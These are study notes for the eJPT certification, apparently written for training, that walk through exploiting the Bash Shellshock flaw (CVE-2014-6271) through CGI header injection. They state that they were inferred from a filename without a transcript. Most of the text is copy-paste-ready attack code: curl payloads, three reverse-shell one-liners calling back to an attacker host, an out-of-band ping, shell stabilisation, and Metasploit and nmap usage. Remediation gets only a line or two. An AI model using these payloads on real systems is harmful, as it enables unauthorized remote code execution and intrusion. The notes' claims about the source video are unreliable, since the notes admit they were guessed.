# Exploiting Bash CVE-2014-6271 (Shellshock) — eJPT Study Notes

Note: No transcript was provided. The following summary is inferred from the filename and typical eJPT lab workflow for Shellshock (CVE-2014-6271). Commands are conservative and commonly used in labs. Adjust paths and parameters to your target.

## What the video covers (Introduction / big picture)
- What Shellshock is: a Bash vulnerability (CVE-2014-6271) where Bash executes arbitrary commands appended after a malicious function definition in environment variables.
- Why it matters for web exploitation: HTTP servers using CGI frequently export HTTP headers (User-Agent, Referer, Cookie, etc.) to environment variables for CGI scripts. If a CGI script invokes Bash (directly via shebang `#!/bin/bash` or indirectly), an attacker can trigger remote code execution by sending a crafted header.
- Typical exploitation path: find CGI endpoints (e.g., /cgi-bin/*), send a crafted header to run a test command (id), then obtain a reverse shell, and stabilize it.
- Tools: curl/Burp for POC, nmap NSE to verify/exploit, Metasploit module for automated exploitation.

## Flow (ordered)
1. Recon HTTP(S) service and look for CGI usage (mod_cgi, /cgi-bin/, script extensions like .sh/.cgi/.pl).
2. Enumerate directories and common CGI paths.
3. Test for Shellshock by injecting into a header (User-Agent) and running a benign command (id or whoami).
4. If confirmed, deliver a reverse shell payload.
5. Stabilize your shell and proceed with post-exploitation.
6. Optional: Use NSE or Metasploit if manual fails or for verification.
7. Document findings and remediation: patch Bash and remove/lock down CGI.

## Tools highlighted
- curl (quick POC and exploitation)
- Burp Suite (manual header control)
- nmap with NSE scripts (http-shellshock or http-vuln-cve2014-6271)
- gobuster/dirb/ffuf (enumerate /cgi-bin/)
- netcat (listener), bash/sh (reverse shells)
- Metasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec

## Typical command walkthrough (detailed, copy-paste friendly)

Set up environment variables for convenience:
```bash
export RHOST=10.10.10.10
export RPORT=80
export PROTO=http
export URI=/cgi-bin/status   # change as discovered (e.g., /cgi-bin/test.cgi, /cgi-bin/admin.cgi)
export URL="$PROTO://$RHOST:$RPORT$URI"
export LHOST=YOUR_IP
export LPORT=4444
```

1) Recon and enumeration
```bash
# Basic service/version scan
nmap -sC -sV -p80,443 $RHOST -oN web-nmap.txt

# Enumerate likely CGI paths
gobuster dir -u "$PROTO://$RHOST:$RPORT" -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl,py,php -t 50
# Focus on /cgi-bin specifically
gobuster dir -u "$PROTO://$RHOST:$RPORT/cgi-bin/" -w /usr/share/wordlists/dirb/common.txt -x sh,pl,py,cgi -t 50
```

2) Quick Shellshock test (manual)
```bash
# Test via User-Agent injection; echo twice to try to produce a valid HTTP body
curl -i -s "$URL" \
  -H 'User-Agent: () { :;}; echo; echo; /bin/bash -c "id"'
```
- Indicators of success: “uid=… gid=…” printed in the response, HTTP 200 or sometimes 500 with command output.

Alternative headers if User-Agent fails:
```bash
curl -i -s "$URL" -H 'Referer: () { :;}; echo; echo; /bin/bash -c "id"'
curl -i -s "$URL" -H 'Cookie: () { :;}; echo; echo; /bin/bash -c "id"'
```

3) Out-of-band confirmation (if no visible output)
```bash
# Start a listener/sniffer to observe callbacks
sudo tcpdump -ni any icmp and host $LHOST

# Trigger ICMP ping from target to you
curl -s "$URL" -H "User-Agent: () { :;}; /bin/bash -c 'ping -c 1 $LHOST'"
```

4) Get a reverse shell
Listener:
```bash
nc -lvnp $LPORT
```

Payload options (try in order):

- Bash TCP reverse shell:
```bash
curl -s "$URL" \
  -H "User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

- mkfifo + nc fallback (works even if bash -i redirection blocked):
```bash
curl -s "$URL" \
  -H "User-Agent: () { :;}; /bin/bash -c 'mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc $LHOST $LPORT > /tmp/f; rm -f /tmp/f'"
```

- netcat -e (works only if nc supports -e):
```bash
curl -s "$URL" \
  -H "User-Agent: () { :;}; /bin/bash -c 'nc -e /bin/bash $LHOST $LPORT'"
```

5) Stabilize TTY once connected
```bash
# Inside the reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
stty cols 120 rows 30
```

6) nmap NSE verification/exploit (optional)
Note: Script names/args can differ by nmap version. Check help if unsure.
```bash
# See available options
nmap --script-help http-shellshock
nmap --script-help http-vuln-cve2014-6271

# Vulnerability check (non-exploit)
nmap -p $RPORT --script http-vuln-cve2014-6271 --script-args "path=$URI" $RHOST

# Command execution with http-shellshock (if available)
nmap -p $RPORT --script http-shellshock \
  --script-args "http-shellshock.uri=$URI,http-shellshock.cmd='id'" $RHOST
```

7) Metasploit (optional)
```bash
msfconsole -q
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS $RHOST
set RPORT $RPORT
set TARGETURI $URI
set PAYLOAD cmd/unix/reverse_bash
set LHOST $LHOST
set LPORT $LPORT
run
```

8) Local Bash quick-test (for validation knowledge; not remote)
```bash
env x='() { :;}; echo VULNERABLE' bash -c 'echo test'
# If vulnerable, "VULNERABLE" prints before "test"
```

## Practical tips
- Shellshock triggers only if the target process invokes Bash. A CGI with shebang `#!/bin/bash` or a wrapper that calls bash is ideal. Python/Perl CGI may still be vulnerable if they call system()/bash.
- If output is not visible, use OOB confirmation (ping/tcpdump) or write to a world-writable location (e.g., /tmp/probe.txt) to confirm RCE.
- Try different headers (User-Agent, Referer, Cookie) and HTTP methods (GET/POST) if one fails.
- HTTPS: add -k to curl to ignore certificate issues: curl -k ...
- Common CGI paths to try: /cgi-bin/status, /cgi-bin/test.cgi, /cgi-bin/admin.cgi, /cgi-bin/stats, /cgi-bin/diagnostics.sh, /cgi-bin/printenv
- Web server errors (500) can still indicate successful execution; inspect body carefully.
- If bash reverse redirection fails, switch to mkfifo+nc or curl/wget dropper approaches.
- Document the exact vulnerable URI, header used, and payload for reporting. Recommend patching Bash (CVE-2014-6271 and follow-ups) and removing/locking down legacy CGI.
- Only test in environments you are authorized to assess.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Find CGI
nmap -sV -p80,443 10.10.10.10
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl,py -t 50
# Suppose we get /cgi-bin/status

# 2) Test Shellshock
curl -i -s http://10.10.10.10/cgi-bin/status \
  -H 'User-Agent: () { :;}; echo; echo; /bin/bash -c "id"'

# 3) Get shell
nc -lvnp 4444
curl -s http://10.10.10.10/cgi-bin/status \
  -H "User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"

# 4) Stabilize
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm; ^Z
stty raw -echo; fg; stty cols 120 rows 30
```

## Summary
- Shellshock (CVE-2014-6271) allows command execution via crafted environment variables parsed by Bash. On web servers with CGI, HTTP headers become env vars; a malicious header can trigger Bash to execute appended commands.
- The core payload pattern: `() { :;}; <command>` sent in a header like User-Agent to a Bash-invoking CGI endpoint.
- Workflow: discover CGI endpoints, test with `id`, then deliver a reverse shell, stabilize, and proceed. Tools like curl, Burp, nmap NSE, and Metasploit can assist.
- Remediation: patch Bash, remove/limit CGI, sanitize environment variables, and restrict header handling.